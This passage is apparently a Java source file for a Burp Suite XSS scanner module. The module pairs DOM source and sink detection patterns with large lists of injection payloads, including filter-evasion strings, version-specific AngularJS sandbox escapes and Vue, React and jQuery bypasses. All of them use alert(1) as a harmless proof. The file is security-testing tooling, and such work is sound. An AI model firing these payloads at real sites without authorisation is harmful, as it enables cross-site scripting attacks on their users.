package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * MODULE 8: XSS Scanner
 * Reflection-based XSS detection with context-aware payload selection,
 * filter evasion techniques, and passive DOM XSS source-to-sink analysis.
 */
public class XssScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Framework detection cache: host → set of detected framework names
    private final ConcurrentHashMap<String, Set<String>> frameworkCachePerHost = new ConcurrentHashMap<>();

    // ==================== DOM XSS: SOURCES, SINKS, PATTERNS ====================

    // HIGH risk: directly user-controllable via URL
    // Removed: location.protocol — returns "http:" or "https:", NOT user-controllable
    // Removed: location.host, location.hostname — not attacker-controlled in same-origin context
    //   (these reflect the current page's host, which the attacker does not control)
    private static final String[] DOM_SOURCES_HIGH = {
            "location.href", "location.search", "location.hash", "location.pathname",
            "document.URL", "document.documentURI", "document.baseURI",
            "window.location", "self.location",
            "URLSearchParams", "new URL(", ".searchParams.get(", ".searchParams",
    };

    // MEDIUM risk: controllable but less direct
    private static final String[] DOM_SOURCES_MEDIUM = {
            "document.referrer", "window.name", "document.cookie", "document.domain",
            "document.title", "history.pushState", "history.replaceState",
            "localStorage.getItem", "sessionStorage.getItem",
            "localStorage[", "sessionStorage[",
            "postMessage", "event.data", "e.data", "evt.data", "msg.data",
            ".responseText", ".responseJSON", ".responseXML",
            "response.text()", "response.json()",
            "XMLHttpRequest", ".readyState",
    };

    // LOW risk: indirect or requires specific conditions
    private static final String[] DOM_SOURCES_LOW = {
            ".value", ".textContent", ".innerText",
            ".getAttribute(", ".dataset",
            "decodeURIComponent(", "decodeURI(",
            "atob(", "JSON.parse(",
            "$.param", "$.getJSON",
    };

    // All sources combined for quick lookup
    private static final String[] DOM_SOURCES_ALL;
    static {
        List<String> all = new ArrayList<>();
        Collections.addAll(all, DOM_SOURCES_HIGH);
        Collections.addAll(all, DOM_SOURCES_MEDIUM);
        Collections.addAll(all, DOM_SOURCES_LOW);
        DOM_SOURCES_ALL = all.toArray(new String[0]);
    }

    // CRITICAL sinks: direct code execution
    private static final String[] DOM_SINKS_EXEC = {
            "eval(", "eval (", "Function(", "Function (",
            "setTimeout(", "setInterval(", "setImmediate(",
            "execScript(", "msSetImmediate(",
            "new Function(", "new Function (",
    };

    // HIGH sinks: HTML injection
    private static final String[] DOM_SINKS_HTML = {
            ".innerHTML", ".outerHTML",
            "document.write(", "document.write (",
            "document.writeln(", "document.writeln (",
            "insertAdjacentHTML(", "insertAdjacentHTML (",
            ".createContextualFragment(",
    };

    // HIGH sinks: URL-based (can lead to javascript: execution)
    private static final String[] DOM_SINKS_URL = {
            "location.href=", "location.assign(", "location.replace(",
            "window.open(", "window.open (",
            ".src=", ".href=", ".action=",
            ".setAttribute(\"href\"", ".setAttribute('href'",
            ".setAttribute(\"src\"", ".setAttribute('src'",
            ".setAttribute(\"action\"", ".setAttribute('action'",
            ".setAttribute(\"data\"", ".setAttribute('data'",
            "window.location=", "self.location=",
            "location=",
    };

    // MEDIUM sinks: jQuery HTML injection
    private static final String[] DOM_SINKS_JQUERY = {
            ".html(", ".append(", ".prepend(",
            ".after(", ".before(", ".replaceWith(",
            ".wrapAll(", ".wrapInner(", ".wrap(",
            "$.globalEval(", "$.parseHTML(",
            "jQuery.globalEval(", "jQuery.parseHTML(",
            "$(", "jQuery(",   // jQuery selector with HTML string
    };

    // MEDIUM sinks: Framework-specific
    private static final String[] DOM_SINKS_FRAMEWORK = {
            "dangerouslySetInnerHTML",                           // React
            "v-html",                                            // Vue
            "bypassSecurityTrustHtml", "bypassSecurityTrustScript",
            "bypassSecurityTrustUrl", "bypassSecurityTrustResourceUrl", // Angular
            "ng-bind-html", "ng-bind-html-unsafe",              // AngularJS
            "$sce.trustAsHtml(", "$sce.trustAs(",                // AngularJS
            "Handlebars.SafeString(", "Ember.String.htmlSafe(",  // Handlebars/Ember
            "Mustache.render(", "_.template(",                   // Mustache/Lodash
            "Lit.unsafeHTML(", "unsafeHTML(",                    // Lit
    };

    // All sinks combined
    private static final String[] DOM_SINKS_ALL;
    static {
        List<String> all = new ArrayList<>();
        Collections.addAll(all, DOM_SINKS_EXEC);
        Collections.addAll(all, DOM_SINKS_HTML);
        Collections.addAll(all, DOM_SINKS_URL);
        Collections.addAll(all, DOM_SINKS_JQUERY);
        Collections.addAll(all, DOM_SINKS_FRAMEWORK);
        DOM_SINKS_ALL = all.toArray(new String[0]);
    }

    // DOM Clobbering patterns — vulnerable named DOM access (Improvement 4)
    private static final String[] DOM_CLOBBERING_ACCESS = {
            "document.getElementById(", "document.getElementsByName(",
            "document.forms.", "document.anchors.",
    };

    // DOM Clobbering sinks — where clobbered values become dangerous
    private static final String[] DOM_CLOBBERING_SINKS = {
            ".href", ".src", ".action", ".value", ".textContent", ".innerHTML",
    };

    // Mutation XSS patterns — innerHTML round-trip indicators (Improvement 5)
    private static final Pattern MXSS_INNERHTML_ROUNDTRIP = Pattern.compile(
            "(\\w+)\\.innerHTML\\s*=\\s*(\\w+)\\.innerHTML",
            Pattern.CASE_INSENSITIVE);
    private static final Pattern MXSS_JQUERY_ROUNDTRIP = Pattern.compile(
            "\\$\\(\\s*(\\w+)\\s*\\)\\.html\\(\\s*\\$\\(\\s*(\\w+)\\s*\\)\\.html\\(\\)",
            Pattern.CASE_INSENSITIVE);

    // Known sanitizers — if present near a sink, reduces confidence
    private static final String[] SANITIZERS = {
            "DOMPurify.sanitize(", "DOMPurify.sanitize (",
            "sanitizeHtml(", "sanitize(",
            "escapeHtml(", "escapeHTML(",
            "htmlEscape(", "xssFilters.",
            "encodeURIComponent(", "encodeURI(",
            "textContent=", "innerText=",
            "createTextNode(", "he.encode(",
            "validator.escape(", "_.escape(",
            "$sce.trustAs", "filterXSS(",
    };

    // Regex patterns for variable assignment tracking
    private static final Pattern VAR_ASSIGN_PATTERN = Pattern.compile(
            "(?:var|let|const)\\s+(\\w+)\\s*=\\s*([^;]{1,200});", Pattern.MULTILINE);
    private static final Pattern ASSIGN_PATTERN = Pattern.compile(
            "(\\w+)\\s*=\\s*([^;=]{1,200});", Pattern.MULTILINE);

    // Regex for jQuery selector with user input
    private static final Pattern JQUERY_SELECTOR_SOURCE = Pattern.compile(
            "\\$\\(\\s*(?:location\\.(?:hash|search|href)|document\\.URL|window\\.name|document\\.referrer)",
            Pattern.CASE_INSENSITIVE);

    // Regex for postMessage handler without origin check
    private static final Pattern POSTMESSAGE_HANDLER = Pattern.compile(
            "addEventListener\\s*\\(\\s*['\"]message['\"]\\s*,\\s*function\\s*\\(([^)]+)\\)",
            Pattern.CASE_INSENSITIVE);

    // Regex for event handler attributes with sources
    private static final Pattern EVENT_HANDLER_ATTR = Pattern.compile(
            "\\bon\\w+\\s*=\\s*[\"']([^\"']{1,500})[\"']", Pattern.CASE_INSENSITIVE);

    // Regex for javascript: URL scheme
    private static final Pattern JS_URL_SCHEME = Pattern.compile(
            "(?:href|src|action|data|formaction)\\s*=\\s*[\"']\\s*javascript\\s*:([^\"']{1,500})[\"']",
            Pattern.CASE_INSENSITIVE);

    // Regex to extract inline <script> blocks
    private static final Pattern SCRIPT_BLOCK_PATTERN = Pattern.compile(
            "<script[^>]*>(.*?)</script>", Pattern.DOTALL | Pattern.CASE_INSENSITIVE);

    // DOM XSS canary for active testing
    private static final String DOM_CANARY = "dOmXsS9c4n4ry";

    // Canary for reflection detection
    private static final String CANARY = "xSsX7c4n4ry";

    // Character probe string for smart filter detection (Improvement 1)
    private static final String CHAR_PROBE = "<>\"'/(;)={}[]|!`^$";

    // Common route path words to skip when extracting path segment targets (Improvement 3)
    private static final Set<String> COMMON_ROUTE_WORDS = Set.of(
            "api", "v1", "v2", "v3", "search", "users", "admin", "static", "assets",
            "css", "js", "img", "public", "login", "logout", "register", "profile",
            "settings", "dashboard", "results", "page", "index", "home", "about",
            "contact", "auth", "oauth", "callback", "webhook", "health", "status",
            "docs", "help", "faq", "terms", "privacy", "legal", "blog", "news",
            "feed", "rss", "sitemap", "robots", "favicon", "manifest", "sw"
    );

    // Context-specific payloads
    private static final Map<String, String[][]> CONTEXT_PAYLOADS = new LinkedHashMap<>();

    static {
        CONTEXT_PAYLOADS.put("HTML_BODY", new String[][]{
                {"<script>alert(1)</script>", "<script>alert(1)</script>", "Basic script tag"},
                {"<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>", "img onerror"},
                {"<svg onload=alert(1)>", "<svg onload=alert(1)>", "svg onload"},
                {"<body onload=alert(1)>", "<body onload=alert(1)>", "body onload"},
                {"<details open ontoggle=alert(1)>", "<details open ontoggle=alert(1)>", "details ontoggle"},
                {"<marquee onstart=alert(1)>", "<marquee onstart=alert(1)>", "marquee onstart"},
                {"<video><source onerror=alert(1)>", "<video><source onerror=alert(1)>", "video source onerror"},
                {"<input onfocus=alert(1) autofocus>", "<input onfocus=alert(1) autofocus>", "input autofocus"},
                {"<select autofocus onfocus=alert(1)>", "<select autofocus onfocus=alert(1)>", "select autofocus"},
                {"<textarea autofocus onfocus=alert(1)>", "<textarea autofocus onfocus=alert(1)>", "textarea autofocus"},
                {"<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img/src=1 onerror=alert(1)>\">", "", "Math/SVG mutation"},
        });
        CONTEXT_PAYLOADS.put("HTML_ATTRIBUTE", new String[][]{
                {"\" onmouseover=\"alert(1)", "onmouseover", "Attribute breakout - double quote"},
                {"' onmouseover='alert(1)", "onmouseover", "Attribute breakout - single quote"},
                {"\" onfocus=\"alert(1)\" autofocus=\"", "onfocus", "Attribute breakout - autofocus"},
                {"' onfocus='alert(1)' autofocus='", "onfocus", "Attribute breakout - single quote autofocus"},
                {"\"><script>alert(1)</script>", "<script>", "Tag breakout - double quote"},
                {"'><script>alert(1)</script>", "<script>", "Tag breakout - single quote"},
                {"\"><img src=x onerror=alert(1)>", "<img", "Img injection - double quote"},
                {"javascript:alert(1)", "javascript:", "Javascript scheme (for href/src)"},
                {"\"><svg/onload=alert(1)>", "<svg", "SVG injection from attribute breakout"},
                {"\" accesskey=\"x\" onclick=\"alert(1)", "onclick", "Accesskey onclick trigger"},
                {"\" style=\"animation-name:x\" onanimationend=\"alert(1)", "onanimationend", "CSS animation event"},
        });
        CONTEXT_PAYLOADS.put("JS_STRING", new String[][]{
                {"</script><script>alert(1)</script>", "<script>alert(1)</script>", "Script tag breakout"},
                {"'-alert(1)-'", "alert(1)", "JS string breakout - single quote"},
                {"\"-alert(1)-\"", "alert(1)", "JS string breakout - double quote"},
                {"\\'-alert(1)//", "alert(1)", "JS escaped quote breakout"},
                {"';alert(1)//", "alert(1)", "JS semicolon breakout - single"},
                {"\";alert(1)//", "alert(1)", "JS semicolon breakout - double"},
        });
        CONTEXT_PAYLOADS.put("JS_TEMPLATE_LITERAL", new String[][]{
                {"${alert(1)}", "alert(1)", "Template literal injection"},
                {"`-alert(1)-`", "alert(1)", "Backtick breakout"},
                {"${7*7}", "49", "Template literal evaluation"},
        });
        CONTEXT_PAYLOADS.put("HTML_COMMENT", new String[][]{
                {"--><script>alert(1)</script><!--", "<script>alert(1)</script>", "Comment breakout"},
                {"--!><script>alert(1)</script>", "<script>alert(1)</script>", "Comment breakout (IE)"},
        });
        CONTEXT_PAYLOADS.put("CSS_CONTEXT", new String[][]{
                {"</style><script>alert(1)</script>", "<script>alert(1)</script>", "Style tag breakout"},
                {"expression(alert(1))", "expression(alert(1))", "CSS expression (IE)"},
        });
    }

    // Filter evasion payloads
    private static final String[][] EVASION_PAYLOADS = {
            {"<ScRiPt>alert(1)</ScRiPt>", "<ScRiPt>alert(1)</ScRiPt>", "Case mixing"},
            {"<scr\0ipt>alert(1)</scr\0ipt>", "alert(1)", "Null byte injection"},
            {"<img src=x onerror=alert(1)>", "onerror=alert", "Event handler"},
            {"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "onerror=", "HTML entity encoding"},
            {"<img/src=x onerror=alert(1)>", "onerror=alert", "Slash instead of space"},
            {"<svg/onload=alert(1)>", "onload=alert", "SVG slash space bypass"},
            {"<iMg sRc=x oNeRrOr=alert(1)>", "oNeRrOr=alert", "Random case"},
            {"%3Cscript%3Ealert(1)%3C/script%3E", "", "URL encoded (double decode check)"},
            {"<scr<script>ipt>alert(1)</scr</script>ipt>", "alert(1)", "Nested tags"},
            {"<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">x</a>", "javascript:", "Entity encoded scheme"},
            {"<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "onbegin=alert", "SVG animate"},
            {"<object data=javascript:alert(1)>", "javascript:", "Object data scheme"},
            {"<isindex type=image src=1 onerror=alert(1)>", "onerror=alert", "Isindex tag"},
            {"<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "Math/SVG mutation XSS"},
            {"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}", "onerror=alert", "SVG style mutation"},
            {"<details open ontoggle=alert(1)>", "ontoggle=alert", "Details ontoggle"},
            {"<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>", "javascript:alert", "SVG animate href"},
            {"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "alert(1)", "Unicode escape sequences"},
            {"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "alert()", "XSS polyglot"},
            {"<form action=javascript:alert(1)><input type=submit>", "javascript:alert", "Form action hijack"},
            {"<input type=hidden onfocus=alert(1) autofocus>", "onfocus=alert", "Hidden input autofocus"},
            {"<body background=javascript:alert(1)>", "javascript:", "Body background scheme (legacy)"},
            {"<link rel=import href=data:text/html,<script>alert(1)</script>>", "<script>alert", "HTML import data scheme"},
    };

    // ==================== FRAMEWORK-SPECIFIC XSS PAYLOADS ====================

    // AngularJS (1.x) payloads — sandbox escapes and expression injection
    private static final String[][] ANGULARJS_PAYLOADS = {
            {"{{7*7}}", "49", "AngularJS basic expression evaluation"},
            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "AngularJS sandbox escape (1.2.0-1.2.1)"},
            {"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}", "alert(1)", "AngularJS sandbox escape (1.2.2-1.2.5)"},
            {"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.2.6-1.2.18)"},
            {"{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor)}}", "alert(1)", "AngularJS sandbox escape (1.2.19-1.2.23)"},
            {"{{'a'.constructor.prototype.charAt=''.concat;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.2.24-1.2.29)"},
            {"{{!ready&&(ready=true)&&(a]constructor.prototype.charAt=[].join;$eval('x=alert(1)'))}}", "alert(1)", "AngularJS sandbox escape (1.3.0)"},
            {"{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.3.1-1.3.2)"},
            {"{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a]constructor.prototype.charAt='[].join;$eval('x=alert(1)')//'}}", "alert(1)", "AngularJS sandbox escape (1.3.3-1.3.18)"},
            {"{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.4.0-1.4.9)"},
            {"{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}", "alert(1)", "AngularJS sandbox escape (1.5.0-1.5.7)"},
            {"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}", "alert(1)", "AngularJS sandbox escape (1.5.8-1.5.9)"},
            // AngularJS >= 1.6 (no sandbox)
            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 constructor chain"},
            {"{{$on.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 $on.constructor"},
            {"{{$eval.constructor('alert(1)')()}}", "alert(1)", "AngularJS >=1.6 $eval.constructor"},
            // Special AngularJS sinks
            {"<div ng-bind-html-unsafe=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "AngularJS ng-bind-html-unsafe"},
            {"{{$sce.trustAsHtml('<img src=x onerror=alert(1)>')}}", "onerror=alert", "AngularJS $sce bypass"},
            {"{{orderBy:[].constructor.from('alert(1)',decodeURI)}}", "alert(1)", "AngularJS orderBy filter exploit"},
    };

    // Angular (2+) payloads — template injection and DomSanitizer bypass
    private static final String[][] ANGULAR_PAYLOADS = {
            {"{{7*7}}", "49", "Angular server-composed template expression"},
            {"<img src=x onerror=alert(1)>", "onerror=alert", "Angular DomSanitizer bypass — img onerror"},
            {"<svg onload=alert(1)>", "onload=alert", "Angular DomSanitizer bypass — svg onload"},
            {"<div [innerHTML]=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "Angular [innerHTML] binding"},
            {"${7*7}", "49", "Angular SSR template injection (ES template literal)"},
            {"<%- 7*7 %>", "49", "Angular SSR template injection (EJS)"},
            {"javascript:alert(1)", "javascript:alert", "Angular href/src javascript: scheme"},
            {"<a [href]=\"'javascript:alert(1)'\">click</a>", "javascript:alert", "Angular [href] binding javascript:"},
            {"<iframe [src]=\"'javascript:alert(1)'\"></iframe>", "javascript:alert", "Angular [src] binding javascript:"},
    };

    // Vue.js payloads — template injection and v-html exploitation
    private static final String[][] VUE_PAYLOADS = {
            {"{{7*7}}", "49", "Vue template expression evaluation"},
            {"{{constructor.constructor('alert(1)')()}}", "alert(1)", "Vue constructor chain"},
            {"{{_c.constructor('alert(1)')()}}", "alert(1)", "Vue _c constructor"},
            {"{{_v.constructor('alert(1)')()}}", "alert(1)", "Vue _v constructor"},
            {"{{this.constructor.constructor('alert(1)')()}}", "alert(1)", "Vue this.constructor chain"},
            {"{{$el.ownerDocument.defaultView.alert(1)}}", "alert(1)", "Vue $el.ownerDocument"},
            // Vue 3 specific
            {"{{$emit.constructor('alert(1)')()}}", "alert(1)", "Vue 3 $emit.constructor"},
            {"{{$nextTick.constructor('alert(1)')()}}", "alert(1)", "Vue 3 $nextTick.constructor"},
            {"{{_openBlock.constructor('alert(1)')()}}", "alert(1)", "Vue 3 _openBlock.constructor"},
            // v-html exploitation
            {"<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>", "onerror=alert", "Vue v-html img onerror"},
            {"<div v-html=\"'<svg onload=alert(1)>'\"></div>", "onload=alert", "Vue v-html svg onload"},
            {"<div v-html=\"'<iframe src=javascript:alert(1)>'\"></div>", "javascript:alert", "Vue v-html iframe javascript:"},
            // v-bind href
            {"<a v-bind:href=\"'javascript:alert(1)'\">click</a>", "javascript:alert", "Vue v-bind:href javascript:"},
            // SSR hydration mismatch
            {"<div id=app>{{constructor.constructor('alert(1)')()}}</div>", "alert(1)", "Vue SSR hydration mismatch"},
            {"<template>{{_c.constructor('alert(1)')()}}</template>", "alert(1)", "Vue template tag injection"},
    };

    // React payloads — dangerouslySetInnerHTML and href javascript:
    private static final String[][] REACT_PAYLOADS = {
            // dangerouslySetInnerHTML exploitation
            {"<img src=x onerror=alert(1)>", "onerror=alert", "React dangerouslySetInnerHTML — img onerror"},
            {"<svg onload=alert(1)>", "onload=alert", "React dangerouslySetInnerHTML — svg onload"},
            {"<details open ontoggle=alert(1)>", "ontoggle=alert", "React dangerouslySetInnerHTML — details ontoggle"},
            {"<math><mtext><table><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">", "onerror=alert", "React dangerouslySetInnerHTML — mutation XSS"},
            // href javascript: scheme (React allows in <a> tags)
            {"javascript:alert(1)", "javascript:alert", "React href javascript: scheme"},
            {"javascript:alert(document.domain)", "javascript:alert", "React href javascript: domain leak"},
            // SSR hydration mismatch (Next.js / Remix)
            {"<div data-reactroot=\"\"><img src=x onerror=alert(1)></div>", "onerror=alert", "React SSR hydration mismatch"},
            {"<script>__NEXT_DATA__={props:{pageProps:{dangerousHtml:'<img src=x onerror=alert(1)>'}}}</script>", "onerror=alert", "Next.js __NEXT_DATA__ injection"},
            // Prototype pollution → dangerouslySetInnerHTML
            {"__proto__[dangerouslySetInnerHTML][__html]=<img src=x onerror=alert(1)>", "onerror=alert", "React prototype pollution → dangerouslySetInnerHTML"},
            // Next.js image src injection
            {"/_next/image?url=javascript:alert(1)&w=128&q=75", "javascript:alert", "Next.js image src injection"},
            {"<div dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}></div>", "onerror=alert", "React dangerouslySetInnerHTML direct"},
            {"<a href=\"javascript:alert(1)\">click</a>", "javascript:alert", "React anchor href javascript:"},
    };

    // jQuery payloads — .html() sinks, selector injection, and CVEs
    private static final String[][] JQUERY_PAYLOADS = {
            // .html() sink exploitation
            {"<img src=x onerror=alert(1)>", "onerror=alert", "jQuery .html() sink — img onerror"},
            {"<svg onload=alert(1)>", "onload=alert", "jQuery .html() sink — svg onload"},
            // Selector injection
            {"#<img src=x onerror=alert(1)>", "onerror=alert", "jQuery selector injection — hash prefix"},
            {"<img src=x onerror=alert(1)>", "onerror=alert", "jQuery $() HTML creation"},
            // $.parseHTML with keepScripts
            {"<script>alert(1)</script>", "<script>alert(1)</script>", "jQuery $.parseHTML keepScripts"},
            // Event handler injection via .attr()
            {"\" onfocus=\"alert(1)\" autofocus=\"", "onfocus", "jQuery .attr() event handler injection"},
            // $.globalEval
            {"alert(1)", "alert(1)", "jQuery $.globalEval test"},
            // AJAX response HTML injection
            {"<div><img src=x onerror=alert(1)></div>", "onerror=alert", "jQuery AJAX response HTML injection"},
            // jQuery < 3.0 selector XSS (CVE-2012-6708)
            {"<img src=x onerror=alert(1) id=x>", "onerror=alert", "jQuery <3.0 selector XSS (CVE-2012-6708)"},
            {"#<img src=x:x onerror=alert(1)//>", "onerror=alert", "jQuery <3.0 hash selector XSS"},
            // jQuery 3.x htmlPrefilter bypass (CVE-2020-11023)
            {"<option><style></option></select><img src=x onerror=alert(1)></style>", "onerror=alert", "jQuery 3.x htmlPrefilter bypass (CVE-2020-11023)"},
            {"<style><style/><img src=x onerror=alert(1)>", "onerror=alert", "jQuery htmlPrefilter style tag bypass"},
            // .wrap()/.replaceWith() event handler injection
            {"<div onmouseover=alert(1)>hover</div>", "onmouseover=alert", "jQuery .wrap() event handler injection"},
            {"<form><button formaction=javascript:alert(1)>click</button></form>", "javascript:alert", "jQuery .replaceWith() formaction injection"},
    };

    @Override
    public String getId() { return "xss-scanner"; }

    @Override
    public String getName() { return "XSS Scanner"; }

    @Override
    public String getDescription() {
        return "Reflected XSS detection with context analysis, filter evasion, and passive DOM XSS scanning.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore, CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        List<Finding> findings = new ArrayList<>();

        // Active: Reflected XSS testing — filtered to target parameter only
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<XssTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        runXssTargets(requestResponse, targets, urlPath);
        return findings;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        List<Finding> findings = new ArrayList<>();

        // Passive: DOM XSS analysis on JavaScript responses
        if (config.getBool("xss.domAnalysis.enabled", true)) {
            findings.addAll(analyzeForDomXss(requestResponse));
        }

        // Active: Reflected XSS testing
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<XssTarget> targets = extractTargets(request);

        api.logging().logToOutput("[XSS] processHttpFlow called: " + request.url()
                + " | params found: " + targets.size());

        runXssTargets(requestResponse, targets, urlPath);
        return findings;
    }

    private void runXssTargets(HttpRequestResponse requestResponse,
                                List<XssTarget> targets, String urlPath) {
        for (XssTarget target : targets) {
            if (!dedup.markIfNew("xss-scanner", urlPath, target.name)) {
                api.logging().logToOutput("[XSS] Skipping '" + target.name + "' — already tested");
                continue;
            }

            try {
                testReflectedXss(requestResponse, target);
                // Active DOM XSS: check if parameter reflects into script blocks near sinks
                if (config.getBool("xss.domAnalysis.enabled", true)) {
                    testActiveDomXss(requestResponse, target);
                }
            } catch (Exception e) {
                api.logging().logToError("XSS test error on " + target.name + ": " + e.getMessage());
            }
        }
    }

    // ==================== PASSIVE: DOM XSS ANALYSIS ====================

    private List<Finding> analyzeForDomXss(HttpRequestResponse requestResponse) {
        List<Finding> findings = new ArrayList<>();
        if (requestResponse.response() == null) return findings;

        String contentType = "";
        for (var h : requestResponse.response().headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { contentType = h.value().toLowerCase(); break; }
        }

        if (!contentType.contains("javascript") && !contentType.contains("text/html")
                && !contentType.contains("application/json")) return findings;

        String body;
        try {
            body = requestResponse.response().bodyToString();
        } catch (Exception e) {
            return findings;
        }
        if (body == null || body.length() < 20) return findings;

        String url = requestResponse.request().url();

        // Extract script blocks from HTML, or treat entire body as JS
        List<String> scriptBlocks = extractScriptBlocks(body, contentType);

        Set<String> reported = new HashSet<>(); // Dedup: "source|sink"

        for (String script : scriptBlocks) {
            // 1. Direct source-to-sink proximity analysis
            analyzeDirectFlows(script, url, requestResponse, findings, reported);

            // 2. Variable flow tracking: var x = source; ... sink(x)
            analyzeVariableFlows(script, url, requestResponse, findings, reported);

            // 3. jQuery-specific DOM XSS patterns
            analyzeJQueryPatterns(script, url, requestResponse, findings, reported);

            // 4. postMessage handlers without origin validation
            analyzePostMessageHandlers(script, url, requestResponse, findings, reported);

            // 5. Dangerous eval-like patterns with sources
            analyzeEvalPatterns(script, url, requestResponse, findings, reported);

            // 6. Dynamic script/iframe loading from user input
            analyzeDynamicLoading(script, url, requestResponse, findings, reported);
        }

        // 7. HTML-level analysis (event handlers, javascript: URLs, framework attrs)
        analyzeHtmlEventHandlers(body, url, requestResponse, findings, reported);
        analyzeJavaScriptUrls(body, url, requestResponse, findings, reported);
        analyzeFrameworkAttributes(body, url, requestResponse, findings, reported);

        // 10. DOM Clobbering detection (Improvement 4)
        analyzeDomClobbering(body, url, requestResponse, findings, reported);

        // 11. Mutation XSS pattern detection (Improvement 5)
        for (String script : scriptBlocks) {
            analyzeMutationXssPatterns(script, url, requestResponse, findings, reported);
        }

        return findings;
    }

    /**
     * Extracts inline <script> block contents from HTML, or returns entire body for JS files.
     */
    private List<String> extractScriptBlocks(String body, String contentType) {
        List<String> blocks = new ArrayList<>();

        if (contentType.contains("javascript") || contentType.contains("application/json")) {
            blocks.add(body);
            return blocks;
        }

        // Extract inline script blocks
        Matcher m = SCRIPT_BLOCK_PATTERN.matcher(body);
        while (m.find()) {
            String content = m.group(1).trim();
            if (!content.isEmpty() && content.length() > 10) {
                blocks.add(content);
            }
        }

        // If no script blocks found but body has JS-like content, analyze it
        if (blocks.isEmpty() && (body.contains("function") || body.contains("var ")
                || body.contains("document.") || body.contains("window."))) {
            blocks.add(body);
        }

        return blocks;
    }

    /**
     * Phase 1: Direct source-to-sink proximity within the same script block.
     * Searches all occurrences (not just the first) and uses configurable proximity.
     */
    private void analyzeDirectFlows(String script, String url, HttpRequestResponse reqResp,
                                     List<Finding> findings, Set<String> reported) {
        for (String source : DOM_SOURCES_ALL) {
            int srcIdx = -1;
            while ((srcIdx = script.indexOf(source, srcIdx + 1)) >= 0) {
                for (String sink : DOM_SINKS_ALL) {
                    String key = source + "|" + sink;
                    if (reported.contains(key)) continue;

                    // Search for sink within 800 chars of source (either direction)
                    int searchStart = Math.max(0, srcIdx - 800);
                    int searchEnd = Math.min(script.length(), srcIdx + source.length() + 800);
                    String region = script.substring(searchStart, searchEnd);

                    int sinkOffset = region.indexOf(sink);
                    if (sinkOffset >= 0) {
                        int sinkAbsIdx = searchStart + sinkOffset;
                        if (sinkAbsIdx == srcIdx) continue; // Same position

                        // Check if sanitizer is present between source and sink
                        boolean sanitized = isSanitized(region);

                        String context = extractContext(script, Math.min(srcIdx, sinkAbsIdx),
                                Math.max(srcIdx + source.length(), sinkAbsIdx + sink.length()));

                        Severity sev = getSinkSeverity(sink);
                        Confidence conf = sanitized ? Confidence.TENTATIVE : getSourceConfidence(source);

                        if (sanitized) {
                            sev = sev == Severity.CRITICAL ? Severity.LOW : Severity.INFO;
                        }

                        findings.add(Finding.builder("xss-scanner",
                                        "DOM XSS: " + source + " → " + sink
                                                + (sanitized ? " (sanitizer detected)" : ""),
                                        sev, conf)
                                .url(url)
                                .evidence("Source: " + source + " | Sink: " + sink
                                        + (sanitized ? " | Sanitizer present" : "")
                                        + "\nContext:\n" + context)
